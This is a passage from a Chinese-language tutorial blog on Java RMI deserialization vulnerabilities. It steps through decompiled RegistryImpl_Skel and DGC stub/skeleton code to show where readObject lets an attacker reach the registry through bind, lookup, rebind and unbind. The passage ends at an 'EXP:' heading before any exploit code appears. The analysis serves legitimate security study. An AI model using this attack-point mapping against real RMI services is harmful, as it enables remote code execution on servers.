class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="总结-注册中心产生的漏洞点"><a href="#总结-注册中心产生的漏洞点" class="headerlink" title="总结-注册中心产生的漏洞点"></a>总结-注册中心产生的漏洞点</h4><ol><li>客户端在请求时 （<code>IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);</code>），<code>lookup</code>的对象是序列化后传到注册中心的，而注册中心的 **RegistryImpl_Skel **中，大部分 case 的函数都有反序列化。如果是一个恶意序列化对象，在注册中心运行到 **RegistryImpl_Skel **时，会产生反序列化漏洞 <code>var98 = (String)var104.readObject();</code></li></ol><h3 id="3-6-服务端-客户端请求时"><a href="#3-6-服务端-客户端请求时" class="headerlink" title="3.6 服务端-客户端请求时"></a>3.6 服务端-客户端请求时</h3><p>过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。</p><p>图中的 RegistryImpl_Stub   DGCImpl_Stub 都不是想要的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png"></p><p>最终拿到的 $Proxy0 是我们需要的动态代理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png"></p><p>同样来到 disp.dispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png"></p><p>不一样的是在 <code>skel != null</code>判断时，此时的 skel 为空，不进入 oldDispatch</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png"></p><p>继续走，获取远程方法 sayHello</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png"></p><p>之后会进入 <font style="color:#080808;background-color:#ffffff;">unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png"></p><p>最终在 <code>result = method.invoke(obj, params);</code><font style="color:#080808;background-color:#ffffff;"> 这一步完成远程调用</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png"></p><h3 id="3-7-DGC-客户端请求服务端"><a href="#3-7-DGC-客户端请求服务端" class="headerlink" title="3.7 DGC-客户端请求服务端"></a>3.7 DGC-客户端请求服务端</h3><blockquote><p><font style="color:rgb(51, 51, 51);">分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。</font></p><p><font style="color:rgb(51, 51, 51);">而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。</font></p><p><font style="color:rgb(51, 51, 51);">而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。</font></p></blockquote><p><strong><font style="color:#080808;background-color:#ffffff;">DGCImpl_Stub</font></strong></p><p><font style="color:rgb(80, 80, 92);">clean 就是”强”清除内存，dirty 就是”弱”清除内存</font></p><p><font style="color:rgb(80, 80, 92);">这里调用了 </font><code>readObject()</code><font style="color:rgb(80, 80, 92);"> 方法，存在反序列化的入口类。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">clean</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, VMID var4, <span class="hljs-type">boolean</span> var5)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">0</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> var6.getOutputStream();<br>            var7.writeObject(var1);<br>            var7.writeLong(var2);<br>            var7.writeObject(var4);<br>            var7.writeBoolean(var5);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var8) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var6);<br>        <span class="hljs-built_in">super</span>.ref.done(var6);<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var9) &#123;<br>        <span class="hljs-keyword">throw</span> var9;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var10) &#123;<br>        <span class="hljs-keyword">throw</span> var10;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var11) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var11);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> Lease <span class="hljs-title function_">dirty</span><span class="hljs-params">(ObjID[] var1, <span class="hljs-type">long</span> var2, Lease var4)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">super</span>.ref.newCall(<span class="hljs-built_in">this</span>, operations, <span class="hljs-number">1</span>, -<span class="hljs-number">669196253586618813L</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> var5.getOutputStream();<br>            var6.writeObject(var1);<br>            var6.writeLong(var2);<br>            var6.writeObject(var4);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var20) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var20);<br>        &#125;<br><br>        <span class="hljs-built_in">super</span>.ref.invoke(var5);<br><br>        Lease var24;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var5.getInputStream();<br>            var24 = (Lease)var9.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var17) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var17);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var18) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var18);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-built_in">super</span>.ref.done(var5);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> var24;<br>    &#125; <span class="hljs-keyword">catch</span> (RuntimeException var21) &#123;<br>        <span class="hljs-keyword">throw</span> var21;<br>    &#125; <span class="hljs-keyword">catch</span> (RemoteException var22) &#123;<br>        <span class="hljs-keyword">throw</span> var22;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception var23) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var23);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong><font style="color:rgb(51, 51, 51);">DGCImpl_Skel</font></strong></p><p><font style="color:rgb(51, 51, 51);">也存在漏洞点</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dispatch</span><span class="hljs-params">(Remote var1, RemoteCall var2, <span class="hljs-type">int</span> var3, <span class="hljs-type">long</span> var4)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (var4 != -<span class="hljs-number">669196253586618813L</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SkeletonMismatchException</span>(<span class="hljs-string">&quot;interface hash mismatch&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">DGCImpl</span> <span class="hljs-variable">var6</span> <span class="hljs-operator">=</span> (DGCImpl)var1;<br>        <span class="hljs-keyword">switch</span> (var3) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                ObjID[] var39;<br>                <span class="hljs-type">long</span> var40;<br>                VMID var41;<br>                <span class="hljs-type">boolean</span> var42;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var14</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var39 = (ObjID[])var14.readObject();<br>                    var40 = var14.readLong();<br>                    var41 = (VMID)var14.readObject();<br>                    var42 = var14.readBoolean();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var36) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var36);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var37) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var37);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                var6.clean(var39, var40, var41, var42);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var35) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var35);<br>                &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                ObjID[] var7;<br>                <span class="hljs-type">long</span> var8;<br>                Lease var10;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>                    var7 = (ObjID[])var13.readObject();<br>                    var8 = var13.readLong();<br>                    var10 = (Lease)var13.readObject();<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var32) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var32);<br>                &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var33) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var33);<br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br>                    var2.releaseInputStream();<br>                &#125;<br><br>                <span class="hljs-type">Lease</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var6.dirty(var7, var8, var10);<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var12</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>                    var12.writeObject(var11);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var31) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var31);<br>                &#125;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;invalid method number&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4、RMI的几种攻击方式"><a href="#4、RMI的几种攻击方式" class="headerlink" title="4、RMI的几种攻击方式"></a>4、RMI的几种攻击方式</h2><p><a href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/</a></p><h3 id="4-1-攻击注册中心"><a href="#4-1-攻击注册中心" class="headerlink" title="4.1 攻击注册中心"></a>4.1 攻击注册中心</h3><p>攻击点还是在 <font style="color:#080808;background-color:#ffffff;">RegistryImpl_Skel 代码中的反序列化，</font></p><p><font style="color:#080808;background-color:#ffffff;">case 的对应关系如下：</font></p><ul><li><font style="color:#080808;background-color:#ffffff;">case0 – bind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var100 = (String)var105.readObject();<br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case1 – list</font><ul><li><font style="color:#080808;background-color:#ffffff;">list 这里没有 readObject ，无法攻击</font></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>var2.releaseInputStream();<br>String[] var99 = var6.list();<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var102</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var102.writeObject(var99);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var92) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var92);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case2 – lookup</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>String var98;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var104</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var98 = (String)var104.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var89) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var89);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var90) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var90);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br><span class="hljs-type">Remote</span> <span class="hljs-variable">var101</span> <span class="hljs-operator">=</span> var6.lookup(var98);<br><br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var2.getResultStream(<span class="hljs-literal">true</span>);<br>    var9.writeObject(var101);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var88) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var88);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case3 –  rebind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>Remote var8;<br>String var97;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var97 = (String)var11.readObject();<br>    var8 = (Remote)var11.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var85) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var85);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var86) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var86);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.rebind(var97, var8);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var84) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var84);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><font style="color:#080808;background-color:#ffffff;">case4 – unbind</font></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>String var7;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    var7 = (String)var10.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var81) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var81);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var82) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var82);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.unbind(var7);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var80) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var80);<br>&#125;<br></code></pre></td></tr></table></figure><p><font style="color:#080808;background-color:#ffffff;"></font></p><h4 id="4-1-1-bind-rebind"><a href="#4-1-1-bind-rebind" class="headerlink" title="4.1.1 bind&amp;rebind"></a>4.1.1 bind&amp;rebind</h4><p>调用 bind 时，会反序列化参数名和远程对象，如果服务端存在 cc 链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>String var100;<br>Remote var103;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">//首先注册中心接收客户端请求，根据请求的 bind 方法进入 case0 分支，</span><br>    <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">var105</span> <span class="hljs-operator">=</span> var2.getInputStream();<br>    <span class="hljs-comment">//然后进行反序列化</span><br>    <span class="hljs-comment">//第一个对象必须是 String</span><br>    var100 = (String)var105.readObject();<br>    <span class="hljs-comment">//第二个对象被强转为 Remote</span><br>    var103 = (Remote)var105.readObject();<br>&#125; <span class="hljs-keyword">catch</span> (IOException var94) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var94);<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var95) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling arguments&quot;</span>, var95);<br>&#125; <span class="hljs-keyword">finally</span> &#123;<br>    var2.releaseInputStream();<br>&#125;<br><br>var6.bind(var100, var103);<br><br><span class="hljs-keyword">try</span> &#123;<br>    var2.getResultStream(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">break</span>;<br>&#125; <span class="hljs-keyword">catch</span> (IOException var93) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;error marshalling return&quot;</span>, var93);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 